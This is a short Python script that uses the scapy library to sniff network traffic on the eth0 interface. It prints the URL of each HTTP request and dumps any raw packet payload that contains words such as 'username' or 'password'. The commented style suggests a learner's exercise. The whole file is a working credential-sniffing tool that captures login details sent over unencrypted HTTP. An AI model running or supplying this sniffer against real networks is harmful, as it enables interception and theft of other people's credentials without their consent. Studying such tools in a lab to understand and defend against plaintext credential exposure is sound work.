#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http #lets me filter http packets

def sniff(interface): #interface we want to capture data from
    scapy.sniff(iface=interface, store=False, prn=processed_sniffed_packet) #for exery packet sniffed, call processed_sniff_packet

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path #HTTP request for url

def get_login_info(packet):
    if packet.haslayer(scapy.Raw): #only need raw layer because it has usernames and passwords
            load = str(packet[scapy.Raw].load) #only print raw layer
            keywords = ["username", "user", "login", "password", "pass"] #key words im looking for
            for keyword in keywords:
                if keyword in load:
                    return load
                    
def processed_sniffed_packet(packet): #take packet and print
    if packet.haslayer(http.HTTPRequest): #if packet has http layer
        url =  get_url(packet)
        print("[+] HTTP Request >> " + url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")
                    

sniff("eth0") #target interface
